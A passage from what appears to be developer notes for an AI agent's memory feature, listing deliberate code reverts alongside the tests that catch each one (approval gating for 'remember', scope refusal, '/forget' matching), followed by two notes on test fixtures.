| Un-gate `remember`, or gate `pin` | `test_remember_requires_approval_and_pin_does_not` | D26 asserted as the PAIR it is — either half alone reads as arbitrary. Note `remember: bool = True` appears in BOTH permission dataclasses; reverting the wrong one proves nothing |
| Remove `remember` from `PIPELINE_UNGRANTABLE` | `test_remember_cannot_be_granted_to_a_research_run` | M17. No `approval_check` means R2 calls it grantable, so one `--grant remember` would let ten unattended passes write durable memories — what D26's consequence 1 forbids |
| Drop the content or the reach from the approval notice | `test_the_notice_shows_the_exact_content`, `test_the_notice_distinguishes_global_from_project_reach` | The gate is only worth having if the prompt shows what it is gating |
| Coerce an unknown scope to the default | `test_an_unknown_scope_is_refused_rather_than_coerced` | A model asking for "global" and getting a project row believes a preference follows the user everywhere when it does not |
| Write a project row with no resolved project | `test_a_project_memory_with_no_resolved_project_is_refused` | `list_memories` matches project rows on the path, so it could never be read back — invisible rather than wrong, which is worse |
| Give a piped run a provider | `test_a_piped_session_stays_headless`, `test_a_piped_chat_turn_carries_none` | M16. Matching `build_review_consent`: nobody is there to ask, so `remember` must not fire |
| Make chat use attended's `honour_run_scope=False` | `test_the_chat_provider_honours_run_scope` | Chat wants §18's per-run shortcut; attended research exists for per-call supervision. The two builders must not converge |
| Stop passing the authorization from `run_chat` | `test_a_chat_turn_carries_the_authorization` | Same call-site lesson as above, applied before it could repeat |
| Let `/forget` match a content substring | `test_forget_refuses_a_substring_rather_than_guessing` | A substring hitting two memories has to pick one, and picking silently deletes what the user did not name |
| Drop `/forget`'s empty-argument check | `test_forget_with_no_argument_explains_itself` | Asserted on "Usage:" and NOT on "/memories", which both branches mention — the first version of this row stayed green through the revert for exactly that reason |

### Two standing notes

**Prompt assembly now reads storage.** Any test that initializes `config_loader` AND
builds an agent or chat prompt needs the `fake_storage` fixture — five existing tests
gained it here. A test that does *not* initialize the loader is unaffected, because
`get_project_path()` returns None and the manager answers with nothing.

**`test_compaction_e2e.py` is now `tests/test_storage_e2e.py`** and is the home for
every real-`storage.py` test, not just compaction's. The one-swap rule in the §21a
notes above still applies and is the reason it is one file.
